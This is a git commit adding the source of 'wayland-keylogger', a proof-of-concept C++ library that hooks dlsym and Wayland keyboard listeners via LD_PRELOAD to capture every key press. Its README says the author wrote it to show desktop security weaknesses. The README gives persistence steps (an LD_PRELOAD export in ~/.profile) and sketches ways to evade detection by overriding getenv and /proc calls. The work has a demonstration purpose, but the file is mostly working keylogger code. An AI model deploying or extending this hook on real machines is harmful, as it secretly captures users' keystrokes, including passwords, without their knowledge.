c1beef72defaf67b0067d6158b476e10dcdab94c
Maarten Baert <maarten-baert@hotmail.com>
2013-12-19 05:05:11 +0100

    Initial commit.

---
+++ Keylogger.cpp
@@ -0,0 +1,172 @@
+/*
+Copyright (c) 2012-2013 Maarten Baert <maarten-baert@hotmail.com>
+
+Permission to use, copy, modify, and/or distribute this software for any purpose with or without fee is hereby granted, provided that the above copyright notice and this permission notice appear in all copies.
+
+THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
+*/
+
+#include "elfhacks.h"
+
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
+#include <wayland-client.h>
+
+struct wl_proxy* my_wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface);
+int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data);
+
+void *(*g_real_dlsym)(void*, const char*) = NULL;
+void *(*g_real_dlvsym)(void*, const char*, const char*) = NULL;
+struct wl_proxy* (*g_real_wl_proxy_create)(struct wl_proxy*, const struct wl_interface*);
+int (*g_real_wl_proxy_add_listener)(struct wl_proxy*, void (**)(void), void*);
+
+int g_hooks_initialized = 0;
+
+void init_hooks() {
+	
+	if(g_hooks_initialized)
+		return;
+	
+	fprintf(stderr, "[wayland-keylogger] init_hooks begin.\n");
+	
+	// part 1: get dlsym and dlvsym
+	eh_obj_t libdl;
+	if(eh_find_obj(&libdl, "*/libdl.so*")) {
+		fprintf(stderr, "[wayland-keylogger] Can't open libdl.so!\n");
+		exit(-181818181);
+	}
+	if(eh_find_sym(&libdl, "dlsym", (void **) &g_real_dlsym)) {
+		fprintf(stderr, "[wayland-keylogger] Can't get dlsym address!\n");
+		eh_destroy_obj(&libdl);
+		exit(-181818181);
+	}
+	if(eh_find_sym(&libdl, "dlvsym", (void **) &g_real_dlvsym)) {
+		fprintf(stderr, "[wayland-keylogger] Can't get dlvsym address!\n");
+		eh_destroy_obj(&libdl);
+		exit(-181818181);
+	}
+	eh_destroy_obj(&libdl);
+	
+	// part 2: get everything else
+	g_real_wl_proxy_create = (struct wl_proxy* (*)(struct wl_proxy*, const struct wl_interface*)) g_real_dlsym(RTLD_NEXT, "wl_proxy_create");
+	if(g_real_wl_proxy_create == NULL) {
+		fprintf(stderr, "[wayland-keylogger] Can't get wl_proxy_create address!\n");
+		exit(-181818181);
+	}
+	g_real_wl_proxy_add_listener = (int (*)(struct wl_proxy*, void (**)(void), void*)) g_real_dlsym(RTLD_NEXT, "wl_proxy_add_listener");
+	if(g_real_wl_proxy_create == NULL) {
+		fprintf(stderr, "[wayland-keylogger] Can't get wl_proxy_add_listener address!\n");
+		exit(-181818181);
+	}
+	
+	fprintf(stderr, "[wayland-keylogger] init_hooks end.\n");
+	
+	g_hooks_initialized = 1;
+	
+}
+
+struct Hook {
+	const char* name;
+	void* address;
+};
+Hook hook_table[] = {
+	{"wl_proxy_create", (void*) &g_real_wl_proxy_create},
+};
+
+struct KeyLoggerData {
+	void (**implementation)(void);
+	void *data;
+};
+
+void MyHandleKeyboardKeymap(void* data, wl_keyboard* keyboard, uint32_t format, int fd, uint32_t size) {
+	KeyLoggerData *d = (KeyLoggerData*) data;
+	((wl_keyboard_listener*) d->implementation)->keymap(d->data, keyboard, format, fd, size);
+}
+void MyHandleKeyboardEnter(void* data, wl_keyboard* keyboard, uint32_t serial, wl_surface* surface, wl_array* keys) {
+	KeyLoggerData *d = (KeyLoggerData*) data;
+	((wl_keyboard_listener*) d->implementation)->enter(d->data, keyboard, serial, surface, keys);
+}
+void MyHandleKeyboardLeave(void* data, wl_keyboard* keyboard, uint32_t serial, wl_surface* surface) {
+	KeyLoggerData *d = (KeyLoggerData*) data;
+	((wl_keyboard_listener*) d->implementation)->leave(d->data, keyboard, serial, surface);
+}
+void MyHandleKeyboardKey(void* data, wl_keyboard* keyboard, uint32_t serial, uint32_t time, uint32_t key, uint32_t state) {
+	KeyLoggerData *d = (KeyLoggerData*) data;
+	if(state) {
+		fprintf(stderr, "[wayland-keylogger] Pressed key %d\n", key);
+	} else {
+		fprintf(stderr, "[wayland-keylogger] Released key %d\n", key);
+	}
+	((wl_keyboard_listener*) d->implementation)->key(d->data, keyboard, serial, time, key, state);
+}
+void MyHandleKeyboardModifiers(void* data, wl_keyboard* keyboard, uint32_t serial, uint32_t mods_depressed, uint32_t mods_latched, uint32_t mods_locked, uint32_t group) {
+	KeyLoggerData *d = (KeyLoggerData*) data;
+	((wl_keyboard_listener*) d->implementation)->modifiers(d->data, keyboard, serial, mods_depressed, mods_latched, mods_locked, group);
+}
+
+wl_keyboard_listener my_keyboard_listener = {
+	MyHandleKeyboardKeymap,
+	MyHandleKeyboardEnter,
+	MyHandleKeyboardLeave,
+	MyHandleKeyboardKey,
+	MyHandleKeyboardModifiers,
+};
+
+struct wl_proxy* g_keyboard_to_log = NULL;
+
+struct wl_proxy* my_wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface) {
+	struct wl_proxy* id = g_real_wl_proxy_create(factory, interface);
+	if(interface == &wl_keyboard_interface) {
+		fprintf(stderr, "[wayland-keylogger] Got keyboard id!\n");
+		g_keyboard_to_log = id;
+	}
+	return id;
+}
+
+int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data) {
+	if(g_keyboard_to_log != NULL && factory == g_keyboard_to_log) {
+		fprintf(stderr, "[wayland-keylogger] Adding fake listener!\n");
+		g_keyboard_to_log = NULL;
+		KeyLoggerData *d = new KeyLoggerData(); // memory leak, I know :)
+		d->implementation = implementation;
+		d->data = data;
+		return g_real_wl_proxy_add_listener(factory, (void (**)(void)) &my_keyboard_listener, d);
+	} else {
+		return g_real_wl_proxy_add_listener(factory, implementation, data);
+	}
+}
+
+// override existing functions
+
+extern "C" struct wl_proxy* wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface) {
+	init_hooks();
+	return my_wl_proxy_create(factory, interface);
+}
+
+extern "C" int wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data) {
+	init_hooks();
+	return my_wl_proxy_add_listener(factory, implementation, data);
+}
+
+extern "C" void* dlsym(void* handle, const char* symbol) {
+	init_hooks();
+	for(unsigned int i = 0; i < sizeof(hook_table) / sizeof(Hook); ++i) {
+		if(strcmp(hook_table[i].name, symbol) == 0) {
+			fprintf(stderr, "[wayland-keylogger] Hooked: dlsym(%s).\n", symbol);
+			return hook_table[i].address;
+		}
+	}
+	return g_real_dlsym(handle, symbol);
+}
+
+extern "C" void* dlvsym(void* handle, const char* symbol, const char* version) {
+	init_hooks();
+	for(unsigned int i = 0; i < sizeof(hook_table) / sizeof(Hook); ++i) {
+		if(strcmp(hook_table[i].name, symbol) == 0) {
+			fprintf(stderr, "[wayland-keylogger] Hooked: dlvsym(%s,%s).\n", symbol, version);
+			return hook_table[i].address;
+		}
+	}
+	return g_real_dlvsym(handle, symbol, version);
+}
--- README.md
+++ README.md
@@ -1,4 +1,18 @@
 wayland-keylogger
 =================
 
-Proof-of-concept Wayland keylogger
+This is a proof-of-concept Wayland keylogger that I wrote to demonstrate the fundamental insecurity of a typical Linux desktop that lacks both sandboxing (chroot, cgroups, ...) and mandatory access control (SELinux). The keylogger requires nothing but user-level access to be installed. Installation is very simple: just put the library somewhere in your home folder and LD_PRELOAD it from ~/.profile (or maybe ~/.bashrc), like this:
+
+    export LD_PRELOAD=/home/user/path/to/libwayland-keylogger.so
+
+This is only a proof of concept and it will simply print the key press/release events to stderr (your terminal). It would be relatively easy to make the keylogger invisible and write the key presses to a file.
+
+I wrote this keylogger in 75 minutes, without any real knowledge of the Wayland protocol. This should give you an idea of how easy it is to write this. It is based on ElfHacks (written by Pyry Haulos, unrelated to this project) and parts of SSR-GLInject (written by me, also unrelated).
+
+There are many ways to break this keylogger - it is not designed to be robust since that was not the goal. But for any possible way to break it, I could add countermeasures as well. Applications could use 'getenv' to check whether LD_PRELOAD is set, but I could overwrite 'getenv' to hide the existence of that variable. Applications could scan the /proc filesystem, but again I could overwrite the relevant system functions to hide it. I think it's pretty clear that this is not a secure system - a secure system would prevent the attack completely rather than trying to detect it after it has already happened. Such security mechanisms exist: even a few basic SELinux rules would completely eliminate this security problem.
+
+The point that I am trying to make is that we should focus on *real* security mechanisms that actually *work*, rather than creating new ones that just give a false sense of security (and annoy the user) without actually making the desktop any more secure.
+
+This program is in no way meant as criticism of the Wayland project. It simply demonstrates that creating a secure desktop requires more than just a few server-side restrictions.
+
+By the way, this inherent weakness is not at all specific to Linux. Similar techniques would also work on Windows and Mac, and essentially any platform that doesn't sandbox applications.
